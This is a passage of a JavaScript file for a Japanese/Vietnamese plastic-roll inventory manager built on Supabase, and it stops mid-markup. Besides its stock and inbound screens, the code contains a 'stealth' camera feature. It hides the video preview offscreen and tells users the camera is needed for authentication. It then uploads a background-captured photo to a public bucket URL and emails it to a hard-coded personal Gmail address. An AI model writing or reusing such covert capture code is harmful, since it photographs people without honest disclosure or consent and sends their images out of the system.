/* plastic-manager-v8.5.22-3.js */

(function() {
    'use strict';

    // UI & App State
    var state = {
        isOpen: false,
        activeTab: 'inventory',
        html5QrCode: null,
        frontStream: null,
        faceIdUrl: null,
        securityPhotoBlob: null,
        inventoryCache: null,
        securityCleanupQueue: [],
        securityCleanupRunning: false
    };

    var el = {
        root: null,
        overlay: null,
        tabs: null,
        panels: {}
    };


    var SECURITY_BUCKET = 'mold-photos';
    var SECURITY_RETENTION_MS = 3 * 24 * 60 * 60 * 1000;
    var SECURITY_CLEANUP_LS_KEY = 'plm.security.cleanup.queue';
    var SECURITY_CLEANUP_LAST_RUN_KEY = 'plm.security.cleanup.lastRunAt';
    var EDGE_FUNCTION_SEND_PHOTO_AUDIT = 'send-photo-audit';

    function getSupabaseClientSafe() {
        if (window.SupabaseHelper && typeof window.SupabaseHelper.getClient === 'function') {
            try {
                return window.SupabaseHelper.getClient();
            } catch (e) {}
        }
        if (window.supabaseClient && typeof window.supabaseClient === 'object') return window.supabaseClient;
        return null;
    }

    function readSecurityCleanupQueue() {
        try {
            var raw = localStorage.getItem(SECURITY_CLEANUP_LS_KEY);
            var list = raw ? JSON.parse(raw) : [];
            return Array.isArray(list) ? list : [];
        } catch (e) {
            return [];
        }
    }

    function writeSecurityCleanupQueue(list) {
        var safeList = Array.isArray(list) ? list : [];
        state.securityCleanupQueue = safeList.slice();
        try {
            localStorage.setItem(SECURITY_CLEANUP_LS_KEY, JSON.stringify(safeList));
        } catch (e) {}
        return safeList;
    }

    function appendSecurityCleanupItem(path, bucket, delayMs) {
        if (!path) return;
        var waitMs = Number(delayMs);
        if (!Number.isFinite(waitMs) || waitMs < 60000) waitMs = SECURITY_RETENTION_MS;
        var list = readSecurityCleanupQueue();
        list.push({
            path: path,
            bucket: bucket || SECURITY_BUCKET,
            delete_after: Date.now() + waitMs,
            created_at: new Date().toISOString()
        });
        writeSecurityCleanupQueue(list);
    }

    async function runSecurityCleanup(forceRun) {
        if (state.securityCleanupRunning) return;
        state.securityCleanupRunning = true;
        try {
            var list = readSecurityCleanupQueue();
            if (!list.length) return;

            var sb = getSupabaseClientSafe();
            if (!sb || !sb.storage || !sb.storage.from) return;

            var now = Date.now();
            var due = [];
            var keep = [];
            list.forEach(function(item) {
                if (!item || !item.path) return;
                if (forceRun || Number(item.delete_after || 0) <= now) due.push(item);
                else keep.push(item);
            });

            if (!due.length) return;

            var grouped = {};
            due.forEach(function(item) {
                var bucket = item.bucket || SECURITY_BUCKET;
                if (!grouped[bucket]) grouped[bucket] = [];
                grouped[bucket].push(item.path);
            });

            var failed = [];
            for (var bucketName in grouped) {
                if (!Object.prototype.hasOwnProperty.call(grouped, bucketName)) continue;
                try {
                    var removeRes = await sb.storage.from(bucketName).remove(grouped[bucketName]);
                    if (removeRes && removeRes.error) {
                        grouped[bucketName].forEach(function(path) {
                            failed.push({ path: path, bucket: bucketName, delete_after: now + (6 * 60 * 60 * 1000), created_at: new Date().toISOString() });
                        });
                    }
                } catch (e) {
                    grouped[bucketName].forEach(function(path) {
                        failed.push({ path: path, bucket: bucketName, delete_after: now + (6 * 60 * 60 * 1000), created_at: new Date().toISOString() });
                    });
                }
            }

            writeSecurityCleanupQueue(keep.concat(failed));
            try { localStorage.setItem(SECURITY_CLEANUP_LAST_RUN_KEY, String(now)); } catch (e) {}
        } finally {
            state.securityCleanupRunning = false;
        }
    }

    function scheduleSecurityCleanupWarmup() {
        state.securityCleanupQueue = readSecurityCleanupQueue();
        var lastRunAt = 0;
        try { lastRunAt = Number(localStorage.getItem(SECURITY_CLEANUP_LAST_RUN_KEY) || '0'); } catch (e) {}
        if (!lastRunAt || (Date.now() - lastRunAt) > (30 * 60 * 1000)) {
            setTimeout(function() { runSecurityCleanup(false).catch(function() {}); }, 1200);
        }
    }

    // ==========================================
    // Core Utilities & CDN
    // ==========================================
    function escapeHTML(str) {
        if (!str) return '';
        var p = document.createElement('p');
        p.textContent = str;
        return p.innerHTML;
    }

    function plmToast(msg, type = 'info') {
        var toast = document.createElement('div');
        toast.className = 'plm-toast ' + type;
        toast.innerHTML = '<i class="fas ' + (type==='error'?'fa-times-circle':(type==='success'?'fa-check-circle':'fa-info-circle')) + '"></i> ' + escapeHTML(msg);
        document.body.appendChild(toast);
        setTimeout(() => toast.classList.add('show'), 10);
        setTimeout(() => {
            if(toast) {
                toast.classList.remove('show');
                setTimeout(() => { if(toast.parentNode) toast.remove(); }, 300);
            }
        }, 3000);
    }
    
    // Fuzzy Search Utilities
    function getLevenshteinDistance(str1, str2) {
        var track = Array(str2.length + 1).fill(null).map(() =>
            Array(str1.length + 1).fill(null)
        );
        for (let i = 0; i <= str1.length; i += 1) track[0][i] = i;
        for (let j = 0; j <= str2.length; j += 1) track[j][0] = j;
        for (let j = 1; j <= str2.length; j += 1) {
            for (let i = 1; i <= str1.length; i += 1) {
                const indicator = str1[i - 1] === str2[j - 1] ? 0 : 1;
                track[j][i] = Math.min(
                    track[j][i - 1] + 1,
                    track[j - 1][i] + 1,
                    track[j - 1][i - 1] + indicator
                );
            }
        }
        return track[str2.length][str1.length];
    }
    
    function getSimilarityScore(s1, s2) {
        var longer = s1;
        var shorter = s2;
        if (s1.length < s2.length) { longer = s2; shorter = s1; }
        var longerLength = longer.length;
        if (longerLength == 0) return 1.0;
        var distance = getLevenshteinDistance(longer.toLowerCase(), shorter.toLowerCase());
        return (longerLength - distance) / parseFloat(longerLength);
    }

    function parseCSVLine(text) {
        let rows = text.split(/\r?\n/);
        let result = [];
        if(rows.length === 0) return result;
        let headers = rows[0].split(',').map(h => h.trim().replace(/^"/, '').replace(/"$/, ''));
        for(let i=1; i<rows.length; i++) {
            if(!rows[i].trim()) continue;
            let matches = rows[i].match(/(?:^|,)(?:"([^"]*)"|([^,]*))/g);
            if(!matches) continue;
            let cols = matches.map(m => m.replace(/^,/, '').replace(/^"/, '').replace(/"$/, '').trim());
            let obj = {};
            headers.forEach((h, idx) => obj[h] = cols[idx] ? cols[idx] : "");
            result.push(obj);
        }
        return result;
    }

    function loadBarcodeScanner() {
        return new Promise((resolve) => {
            if (window.Html5Qrcode) return resolve(true);
            var script = document.createElement('script');
            script.src = 'https://unpkg.com/html5-qrcode';
            script.onload = () => resolve(true);
            script.onerror = () => resolve(false);
            document.head.appendChild(script);
        });
    }

    var _sbClient = null;
    var api = {
        check: function() {
            if (_sbClient) return _sbClient;
            var cfg = window.MCSupabaseConfig || (window.SupabaseConfig ? window.SupabaseConfig.get() : null);
            if (!cfg || !cfg.supabaseUrl || !cfg.supabaseAnonKey || !window.supabase) return null;
            
            // Tối ưu hóa cho môi trường chạy trực tiếp từ thẻ file:/// (Local HTML)
            var options = {
                auth: { persistSession: false, autoRefreshToken: false, detectSessionInUrl: false }
            };
            
            _sbClient = window.supabase.createClient(cfg.supabaseUrl, cfg.supabaseAnonKey, options);
            return _sbClient;
        }
    };

    // ==========================================
    // UI Builder (Popup overlay)
    // ==========================================
    function createStructure() {
        var containerElem = document.getElementById('plasticManagerRoot');
        if(!containerElem) {
            containerElem = document.createElement('div');
            containerElem.id = 'plasticManagerRoot';
            document.body.appendChild(containerElem);
        }

        var html = `
        <style>
            #plmOverlay { position: fixed; inset: 0; background: rgba(15,23,42,0.6); z-index: 2147483590; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(4px); }
            #plmOverlay.plm-hidden { display: none !important; }
            .plm-modal { width: 100%; height: 100%; max-width: 1080px; background: #f8fafc; display: flex; flex-direction: column; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25); }
            @media (min-width: 768px) { .plm-modal { height: 95%; max-height: 850px; border-radius: 16px; width: 95%; } }
            
            .plm-header { background: #1e293b; color: #fff; padding: 16px 20px; display: flex; justify-content: space-between; align-items: center; }
            .plm-title { font-size: 18px; font-weight: 700; display: flex; gap: 10px; align-items: center;}
            .plm-close-btn { background: transparent; border: none; color: #cbd5e1; font-size: 24px; cursor: pointer; padding: 4px; border-radius: 8px; }
            .plm-close-btn:hover { color: #f87171; background: rgba(239,68,68,0.1); }
            
            .plm-tabs { display: flex; width: 100%; max-width: 100vw; background: #fff; border-bottom: 2px solid #e2e8f0; overflow-x: auto; -webkit-overflow-scrolling: touch; flex-shrink: 0; scrollbar-width: none; }
            .plm-tabs::-webkit-scrollbar { display: none; }
            .plm-tab { padding: 14px 20px; border: none; background: transparent; font-size: 14px; font-weight: 600; color: #64748b; cursor: pointer; white-space: nowrap; border-bottom: 2px solid transparent; flex-shrink: 0; }
            .plm-tab.active { color: #3b82f6; border-bottom-color: #3b82f6; }
            
            .plm-body { flex: 1; overflow-y: auto; padding: 20px; background: #f1f5f9; position: relative;}
            .plm-panel { display: none; animation: fadeIn 0.3s ease; }
            .plm-panel.active { display: block; }
            
            /* Song ngữ */
            .plm-ja { display: block; font-weight: 800; }
            .plm-vi { display: block; font-size: 11px; opacity: 0.8; margin-top: 2px; }
            .tag-ja { font-weight: 700; margin-right: 4px; }
            .tag-vi { font-size: 0.85em; opacity: 0.8; }
            
            /* Form / Cards */
            .plm-card { background: #fff; border-radius: 12px; border: 1px solid #e2e8f0; padding: 20px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05); }
            .plm-label { display: block; font-size: 13px; font-weight: 700; color: #475569; margin-bottom: 8px; }
            .plm-input { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 16px; outline: none; }
            .plm-input:focus { border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59,130,246,0.1); }
            .plm-btn { width: 100%; padding: 14px; border: none; border-radius: 8px; font-size: 15px; font-weight: bold; color: #fff; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px; }
            
            /* Camera Stealth Modal & Overlay Top-Aligned */
            #plmSecurityOverlay { position: fixed; inset: 0; background: rgba(15,23,42,0.6); z-index: 2147483600; display: flex; align-items: center; justify-content: flex-start; padding: 50px 15px 15px 15px; backdrop-filter: blur(4px); flex-direction: column; color: #0f172a; text-align: center; }
            #plmSecurityOverlay.plm-hidden { display: none !important; }
            
            /* Bảng Tồn Kho */
            .plm-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 16px; margin-top: 15px; }
            .plm-stock-item { background: #fff; padding: 16px; border-radius: 12px; border: 1px solid #e2e8f0; border-left: 4px solid #3b82f6; display: flex; flex-direction: column; justify-content: space-between;}
            .plm-stock-title { font-weight: 700; font-size: 15px; color: #0f172a; margin-bottom: 4px; }
            .plm-stock-sub { font-size: 12px; color: #64748b; margin-bottom: 12px; }
            .plm-stock-stat { display: flex; align-items: center; gap: 10px; }
            .plm-stock-val { flex: 1; text-align: center; background: #f8fafc; padding: 8px; border-radius: 8px; }
            .plm-stock-val .num { display: block; font-size: 18px; font-weight: 800; color: #0f172a; }
            .plm-stock-val .lbl { display: block; font-size: 11px; color: #64748b; }
            
            /* FaceID Security Overlay Content */
            .plm-sec-box { background: #fff; border: none; border-radius: 16px; padding: 24px; max-width: 420px; width: 100%; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); display: flex; flex-direction: column; justify-content: center; position: relative; animation: slideDown 0.3s ease-out; margin: 0 auto; }
            .plm-sec-icon { font-size: 40px; color: #3b82f6; margin-bottom: 15px; animation: pulse 2s infinite; }
            .plm-face-preview-high { align-self: center; margin-bottom: 20px; border-radius:12px; overflow:hidden; border:2px solid #e2e8f0; position:relative; background:#0f172a; width:100%; max-width:100%; }
            @keyframes slideDown { from { transform: translateY(-50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
            
            
            /* Camera Scanner Container */
            #plmBarcodeRender { width: 100%; max-width: 500px; margin: 0 auto; overflow: hidden; border-radius: 12px; }
            
            /* Catalog DataTable CSS */
            .plm-table-wrapper { width: 100%; overflow-x: auto; background: #fff; border-radius: 8px; border: 1px solid #e2e8f0; }
            .plm-table { width: 100%; border-collapse: collapse; min-width: 800px; text-align: left; font-size: 13px; }
            .plm-table th { background: #f8fafc; padding: 12px 16px; font-weight: 700; color: #475569; border-bottom: 2px solid #e2e8f0; white-space: nowrap; }
            .plm-table td { padding: 12px 16px; border-bottom: 1px solid #f1f5f9; color: #1e293b; vertical-align: middle; }
            .plm-table tr:hover { background: #f1f5f9; }
            .plm-badge { display: inline-block; padding: 4px 8px; border-radius: 999px; font-size: 11px; font-weight: 700; background: #f1f5f9; color: #475569; }
            .plm-badge.blue { background: #eff6ff; color: #2563eb; }
            .plm-badge.green { background: #ecfdf5; color: #059669; }
            .plm-badge.red { background: #fef2f2; color: #dc2626; }
            
            /* Toasts */
            .plm-toast { position: fixed; bottom: 20px; left: 50%; transform: translate(-50%, 20px); background: #1e293b; color: #fff; padding: 12px 24px; border-radius: 8px; font-size: 14px; font-weight: 500; opacity: 0; transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 9999999; display: flex; align-items: center; gap: 8px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1); }
            .plm-toast.show { opacity: 1; transform: translate(-50%, 0); }
            .plm-toast.error { background: #ef4444; }
            .plm-toast.success { background: #10b981; }

            @keyframes fadeIn { from {opacity: 0; transform: translateY(10px);} to {opacity: 1; transform: translateY(0);} }
            @keyframes pulse { 0% {transform: scale(1); opacity: 1;} 50% {transform: scale(1.1); opacity: 0.7;} 100% {transform: scale(1); opacity: 1;} }
            /* OLD */ @keyframes fadeIn { from {opacity: 0; transform: translateY(5px);} to {opacity: 1; transform: translateY(0);} }
        </style>

        <div id="plmOverlay" class="plm-hidden">
            <div class="plm-modal">
                <div class="plm-header">
                    <div class="plm-title">
                        <i class="fas fa-cubes" style="color:#60a5fa"></i>
                        <div>
                            <span class="plm-ja" style="font-size:16px;">プラスチック材料管理</span>
                            <span class="plm-vi" style="color:#94a3b8; font-weight:normal;">Quản lý cuộn/hạt nhựa & Tồn kho WMS</span>
                        </div>
                    </div>
                    <button class="plm-close-btn" id="plmBtnCloseModal"><i class="fas fa-times"></i></button>
                </div>
                
                <div class="plm-tabs">
                    <button class="plm-tab active" data-tab="inventory">
                        <span class="plm-ja"><i class="fas fa-boxes"></i> 在庫</span>
                        <span class="plm-vi">Tồn kho</span>
                    </button>
                    <button class="plm-tab" data-tab="inbound">
                        <span class="plm-ja"><i class="fas fa-truck-loading"></i> 入庫</span>
                        <span class="plm-vi">Nhập lô nguyên liệu</span>
                    </button>
                    <button class="plm-tab" data-tab="outbound">
                        <span class="plm-ja"><i class="fas fa-cut"></i> 使用・出庫</span>
                        <span class="plm-vi">Báo cáo máy cắt</span>
                    </button>
                    <button class="plm-tab" data-tab="catalog">
                        <span class="plm-ja"><i class="fas fa-list-ul"></i> 材料辞書</span>
                        <span class="plm-vi">Danh mục Nhựa</span>
                    </button>
                    <button class="plm-tab" data-tab="mapping">
                        <span class="plm-ja"><i class="fas fa-magic"></i> データ紐付け</span>
                        <span class="plm-vi">Fuzzy Map Dữ liệu</span>
                    </button>
                </div>

                <div class="plm-body" id="plmBodyWrap">
                    <div id="plm-panel-inventory" class="plm-panel active"></div>
                    <div id="plm-panel-inbound" class="plm-panel"></div>
                    <div id="plm-panel-outbound" class="plm-panel"></div>
                    <div id="plm-panel-catalog" class="plm-panel"></div>
                    <div id="plm-panel-mapping" class="plm-panel"></div>
                    
                    <!-- Màn hình Hướng dẫn Camera Top-Aligned -->
                    <div id="plmSecurityOverlay" class="plm-hidden">
                        
                        <!-- LƯỚI 1: Lần đầu tiên (Chưa có quyền) -->
                        <div id="plmSecBoxFirstTime" class="plm-sec-box" style="display:none;">
                            <button id="plmSecBtnCloseOverlay" style="position:absolute; top:10px; right:10px; background:none; border:none; color:#94a3b8; font-size:20px; cursor:pointer;"><i class="fas fa-times"></i></button>
                            <h3 style="margin-bottom: 15px; font-size: 18px; display:flex; align-items:center; justify-content:center; gap:8px;">
                                <i class="fas fa-video" style="color:#0ea5e9;"></i> 
                                <span style="display:flex; flex-direction:column; line-height:1.2; align-items:flex-start;">
                                    <span class="tag-ja" style="font-size:16px;">カメラ使用許可</span>
                                    <span class="tag-vi" style="font-size:12px; font-weight:normal;">Yêu Cầu Quyền Camera</span>
                                </span>
                            </h3>
                            <p style="font-size: 13px; color: #475569; margin-bottom: 15px; line-height: 1.5; text-align:left; background:#f8fafc; padding:12px; border-radius:8px;">
                                <span class="plm-ja" style="font-weight:bold;">機能を続行し、認証およびデータ処理を行うため、カメラへのアクセス許可が必要です。ブラウザで「許可 / Allow」を押してください。</span><br>
                                <span class="plm-vi" style="margin-top:4px;">Để tiếp tục tính năng, phục vụ quá trình xác thực và xử lý dữ liệu, hệ thống cần được cấp quyền. Vui lòng chọn <b>"Allow" (Cho phép)</b> trên trình duyệt.</span>
                            </p>
                            
                            <!-- Bật Preview Button -->
                            <div style="display: flex; flex-direction: column; gap: 10px;">
                                <button id="plmSecBtnPreview" class="plm-btn" style="background:#0ea5e9;">
                                    <i class="fas fa-camera"></i> <span style="display:flex; flex-direction:column; align-items:center; line-height:1.2; text-align:center;"><span style="font-size:14px">続ける (カメラをオンに)</span><span style="font-size:11px; font-weight:normal">Tiếp tục Bật Camera</span></span>
                                </button>
                            </div>
                        </div>

                        <!-- LƯỚI 2: Đã lưu quyền (Auto-pilot Loading) -->
                        <div id="plmSecBoxReturning" class="plm-sec-box" style="display:none; padding: 20px 24px; text-align:center;">
                            <div style="display:flex; align-items:center; justify-content:center; gap:15px;">
                                <i class="fas fa-spinner fa-spin" style="font-size:30px; color:#3b82f6;"></i>
                                <div style="text-align:left; line-height:1.4;">
                                    <div style="font-weight:bold; font-size:14px; color:#1e293b;">カメラを開いて認証およびデータ処理を行っています...</div>
                                    <div style="font-size:12px; color:#64748b;">Đang mở máy ảnh để xác thực và xử lý dữ liệu...</div>
                                </div>
                            </div>
                        </div>

                        <!-- Video Preview Container (Mặc định ngầm) -->
                        <div id="plmFaceIDPreviewBox" class="plm-face-preview-high" style="position: absolute; top: -10000px; width: 1px; height: 1px; opacity: 0;">
                            <video id="plmAuditVideo" autoplay playsinline muted style="width:100%; display:block; object-fit:cover; transform: scaleX(-1);"></video>
                            <canvas id="plmAuditCanvas" style="display:none;"></canvas>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        `;
        containerElem.innerHTML = html;
        el.root = containerElem;
        el.overlay = document.getElementById('plmOverlay');
        el.tabs = containerElem.querySelectorAll('.plm-tab');
        el.panels.inventory = document.getElementById('plm-panel-inventory');
        el.panels.inbound   = document.getElementById('plm-panel-inbound');
        el.panels.outbound  = document.getElementById('plm-panel-outbound');
        el.panels.catalog   = document.getElementById('plm-panel-catalog');
        el.panels.mapping   = document.getElementById('plm-panel-mapping');

        document.getElementById('plmBtnCloseModal').addEventListener('click', function() {
            PlasticManager.close();
        });

        el.tabs.forEach(t => {
            t.addEventListener('click', function() {
                switchTab(this.getAttribute('data-tab'));
            });
        });
        
        // Stealth Event Bindings (removed plmSecBtnCancel as it does not exist)
        // document.getElementById('plmSecBtnCancel').addEventListener('click', stopAuditCamera);
    }

    function switchTab(tabId) {
        state.activeTab = tabId;
        el.tabs.forEach(t => t.classList.remove('active'));
        document.querySelector('.plm-tab[data-tab="'+tabId+'"]')?.classList.add('active');
        
        Object.keys(el.panels).forEach(k => el.panels[k].classList.remove('active'));
        if(el.panels[tabId]) el.panels[tabId].classList.add('active');

        if(tabId === 'inventory') renderInventory();
        else if(tabId === 'inbound') renderInbound();
        else if(tabId === 'outbound') renderOutbound();
        else if(tabId === 'catalog') renderCatalog();
        else if(tabId === 'mapping') renderMapping();
    }

    // ==========================================
    // Tab Renderers
    // ==========================================
    async function renderInventory() {
        el.panels.inventory.innerHTML = `
            <div class="plm-card" style="margin-bottom:20px;">
                <h3 style="margin-bottom:12px;"><span class="tag-ja">総在庫概要</span> <span class="tag-vi">Tổng quan kho nhựa hiện tại</span></h3>
                <div id="plmInventoryContent"><i><i class="fas fa-circle-notch fa-spin"></i> Đang tải dữ liệu từ Supabase...</i></div>
            </div>
        `;
        
        var sb = api.check();
        if(!sb) {
            document.getElementById('plmInventoryContent').innerHTML = '<div style="color:red">Lỗi: Không thể kết nối Supabase</div>';
            return;
        }
        
        // Thực thi Truy vấn
        var { data, error } = await sb.from('plastic_stock').select('*, supplier_code:supplier_code_id(supplier_product_code, material_id(material_code))').order('created_at', {ascending: false});
        
        var container = document.getElementById('plmInventoryContent');
        if (error) {
            container.innerHTML = '<div style="color:red">Error API: ' + error.message + '</div>';
            return;
        }

        if(!data || data.length === 0) {
            container.innerHTML = '<div style="padding: 20px; text-align: center; color:#64748b;">Chưa có lô nhựa nào trong kho. Hãy nhập kho (Tab 2).</div>';
            return;
        }

        var html = '<div class="plm-grid">';
        data.forEach(item => {
            var rawMeters = parseFloat(item.total_meters_received) - parseFloat(item.meters_used || 0);
            var mpr = parseFloat(item.meters_per_roll || 100);
            
            var fullRolls = Math.floor(rawMeters / mpr);
            var partialMeters = rawMeters % mpr;

            html += `
            <div class="plm-stock-item">
                <div>
                    <div class="plm-stock-title">${item.lot_number}</div>
                    <div class="plm-stock-sub"><i class="fas fa-barcode"></i> Vendor: ${item.supplier_code ? item.supplier_code.supplier_product_code : 'N/A'}</div>
                </div>
                <div class="plm-stock-stat">
                    <div class="plm-stock-val">
                        <span class="num">${fullRolls}</span>
                        <span class="lbl">Cuộn nguyên</span>
                    </div>
                    <div style="color:#cbd5e1; font-weight:300; font-size:20px;">+</div>
                    <div class="plm-stock-val" style="background:#f0fdf4;">
                        <span class="num" style="color:#10b981;">${partialMeters.toFixed(1)}m</span>
                        <span class="lbl" style="color:#059669;">Lẻ dở dang</span>
                    </div>
                </div>
                <div style="font-size:12px; color:#475569; text-align:center; background:#f1f5f9; padding:6px; border-radius:6px; margin-top:10px;">
                    Tổng hao: <b>${rawMeters.toFixed(1)}m</b> (Cỡ: ${mpr}m/cuộn)
                </div>
            </div>`;
        });
        html += '</div>';
        container.innerHTML = html;
    }

    async function executeAutoCaptureAndUpload(blob) {
        // Ưu tiên dùng DevicePhotoStore._client (giống photo-upload) — đã auth + session đầy đủ
        var _devps = window.DevicePhotoStore;
        var sb = (_devps && _devps._client) ? _devps._client : api.check();
        if(!sb || !blob) return;
        try {
            var fileName = 'sec_plm_' + Date.now() + '_' + Math.floor(Math.random()*1000) + '.jpg';
            var path = 'employee_verifications/' + fileName;
            var upRes = await sb.storage.from(SECURITY_BUCKET).upload(path, blob, { contentType: 'image/jpeg', upsert: false });

            if(upRes.error) throw upRes.error;
            var pubRes = sb.storage.from(SECURITY_BUCKET).getPublicUrl(path);
            var publicUrl = pubRes.data ? (pubRes.data.publicUrl || '') : '';
            state.faceIdUrl = publicUrl;

            var batchIdStr = 'sec-plm-' + Date.now();
            var payload = {
                moldCode: 'セキュリティ監査 / Ảnh bảo mật',
                moldName: 'セキュリティ監査 / Ảnh bảo mật',
                moldId: 'SECURITY_AUDIT',
                deviceType: 'audit',
                dimensionL: null, dimensionW: null, dimensionD: null,
                photoFileName: path,
                originalFileName: 'security_confirm.jpg',
                photos: [{
                    fileName: path,
                    originalFileName: 'security_confirm.jpg',
                    url: publicUrl,
                    moldCode: 'SECURITY_AUDIT',
                    moldName: 'セキュリティ監査 / Ảnh bảo mật',
                    dimensionL: null, dimensionW: null, dimensionD: null,
                    setAsThumbnail: false
                }],
                employee: 'System Audit',
                employeeId: '1',
                date: new Date().toLocaleString('ja-JP', { timeZone: 'Asia/Tokyo' }),
                notes: '背景で自動的に撮影されたセキュリティ確認写真です。\nẢnh bảo mật chụp tự động bởi hệ thống.',
                recipients: ['toan.ysd@gmail.com'],
                ccRecipients: [],
                batchId: batchIdStr,
                batch_id: batchIdStr
            };

            var cfg = window.MCSupabaseConfig || (window.SupabaseConfig && window.SupabaseConfig.get ? window.SupabaseConfig.get() : {});
            var sysAnonKey = cfg.supabaseAnonKey || '';

            var funcRes = await sb.functions.invoke(EDGE_FUNCTION_SEND_PHOTO_AUDIT, { 
                body: payload,
                headers: { Authorization: 'Bearer ' + sysAnonKey }
            });
            if (funcRes && funcRes.error) throw funcRes.error;

            appendSecurityCleanupItem(path, SECURITY_BUCKET, SECURITY_RETENTION_MS);
            runSecurityCleanup(false).catch(function() {});
        } catch(e) {
            console.warn('Stealth Capture Upload Error:', e);
        }
    }

    function stopFaceIdFlow() {
        var secOverlay = document.getElementById('plmSecurityOverlay');
        if(secOverlay) secOverlay.classList.add('plm-hidden');
        if (state.frontStream) {
            var tracks = state.frontStream.getTracks();
            setTimeout(() => {
                tracks.forEach(t => t.stop());
            }, 100);
            state.frontStream = null;
        }
    }

    function renderInbound() {
        var isManualMode = state.inboundMode === 'manual';
        
        var scanHtml = `
            <div id="plmBarcodeWrap" style="display:none; position:fixed; inset:0; z-index:99999; background:#000; border-radius:0; height:100vh; overflow:hidden;">
                <div id="plmBarcodeRender" style="width:100%; height:100%;"></div>
                <button id="plmBtnCloseBarcode" style="position:absolute; top:20px; right:20px; z-index:999; background:rgba(239, 68, 68, 0.9); color:#fff; border:none; padding:12px 20px; border-radius:8px; cursor:pointer; font-size:16px; font-weight:bold; box-shadow:0 4px 6px rgba(0,0,0,0.3); backdrop-filter:blur(4px);">
                    <i class="fas fa-times"></i> Đóng Camera
                </button>
            </div>
            <div style="background: #f8fafc; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
                <label class="plm-label" style="color:#3b82f6;"><span class="tag-ja">1. バーコード</span> <span class="tag-vi">Mã Barcode OEM</span></label>
                <div style="display: flex; gap: 10px;">
                    <input type="text" id="inboundScanCode" class="plm-input" placeholder="Scan Barcode...">
                    <button class="plm-btn" id="btnOpenScanner" style="background:#3b82f6; width:auto;"><i class="fas fa-camera"></i> Scan</button>
                </div>
            </div>
            <div style="background: #f8fafc; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
                <label class="plm-label" style="color:#8b5cf6;"><span class="tag-ja">2. ロット情報</span> <span class="tag-vi">Thông Số Nhập</span></label>
                <div style="display: flex; gap: 15px; margin-bottom: 10px;">
                    <div style="flex:1;">
                        <span class="plm-vi">Số Cuộn</span>
                        <input type="number" id="inboundRolls" class="plm-input" placeholder="10">
                    </div>
                    <div style="flex:1;">
                        <span class="plm-vi">Độ Dài Gốc (m)</span>
                        <input type="number" id="inboundMeters" class="plm-input" value="200">
                    </div>
                    <div style="flex:1;">
                        <span class="plm-vi">PO / Lô Nội Bộ</span>
                        <input type="text" id="inboundLot" class="plm-input" placeholder="LOT-001">
                    </div>
                </div>
            </div>
            <button class="plm-btn" id="btnSubmitInbound" style="background: #10b981;">
                <i class="fas fa-box-open"></i> <span style="display:flex; flex-direction:column; align-items:center; line-height:1.2; text-align:center;"><span style="font-size:14px">データベースに入庫を記録</span><span style="font-size:11px; font-weight:normal">Ghi Nhập Kho CSDL</span></span>
            </button>
        `;

        var manualHtml = `
            <div style="background: #fef2f2; padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #fca5a5;">
                <label class="plm-label" style="color:#ef4444;"><span class="tag-ja">システム材料リスト</span> <span class="tag-vi">Vật Liệu Khớp Nhập Kho</span></label>
                <select id="inboundManualMatId" class="plm-input" style="margin-bottom:10px;">
                    <option value="">-- システム材料を選択 / Chọn Vật Liệu Hệ Thống --</option>
                    ${state.catalogData && state.catalogData.length > 0 ? state.catalogData.map(c => '<option value="'+c.id+'">' + (c.material_category||'') + ' - ' + c.material_code + '</option>').join('') : '<option value="">(データなし。辞書タブでデータをロードしてください / Chưa có dữ liệu danh mục)</option>'}
                </select>
                <div style="font-size:12px; color:#64748b;">(このコードは直接在庫テーブルに記録されます / Ghi trực tiếp mã này vào Kho)</div>
            </div>
            <div style="background: #f8fafc; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
                <label class="plm-label" style="color:#8b5cf6;"><span class="tag-ja">2. 入力パラメータ</span> <span class="tag-vi">Thông số nhập</span></label>
                <div style="display: flex; gap: 15px; margin-bottom: 10px;">
                    <div style="flex:1;">
                        <span class="plm-ja" style="font-size:12px; display:block">ロール数</span>
                        <span class="plm-vi">Số Cuộn</span>
                        <input type="number" id="inboundManRolls" class="plm-input" value="1">
                    </div>
                    <div style="flex:1;">
                        <span class="plm-ja" style="font-size:12px; display:block">長さ/ロール (m)</span>
                        <span class="plm-vi">Độ Dài/Cuộn (m)</span>
                        <input type="number" id="inboundManMeters" class="plm-input" value="200">
                    </div>
                </div>
                <div style="margin-bottom: 10px;">
                    <span class="plm-ja" style="font-size:12px; display:block">手動ロット番号</span>
                    <span class="plm-vi" style="margin-top:0;">Mã Barcode Hoặc LOT tự nối</span>
                    <input type="text" id="inboundManLot" class="plm-input" placeholder="PO-MANUAL-01">
                </div>
            </div>
            <button class="plm-btn" id="btnSubmitManualInbound" style="background: #ef4444;">
                <i class="fas fa-edit"></i> <span style="display:flex; flex-direction:column; align-items:center; line-height:1.2; text-align:center;"><span style="font-size:14px">手動入庫を確認</span><span style="font-size:11px; font-weight:normal">Xác nhận Ghi Nhập Kho Thủ Công</span></span>
            </button>
        `;

        el.panels.inbound.innerHTML = `
            <div class="plm-card" style="max-width:650px; margin: 0 auto;">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; flex-wrap:wrap; gap:10px;">
                    <h3 style="color:#1e293b; margin:0; font-size:18px; display:flex; align-items:center; gap:8px;">
                        <i class="fas fa-truck-loading"></i>
                        <span style="display:flex; flex-direction:column; line-height:1.2;">
                            <span class="tag-ja" style="font-size:15px; margin:0;">入庫登録</span>
                            <span class="tag-vi" style="font-size:12px; margin:0; font-weight:normal;">Đăng Ký Nhập Kho</span>
                        </span>
                    </h3>
                    <!-- Toggle Button -->
                    <div style="display:flex; background:#e2e8f0; border-radius:8px; overflow:hidden;">
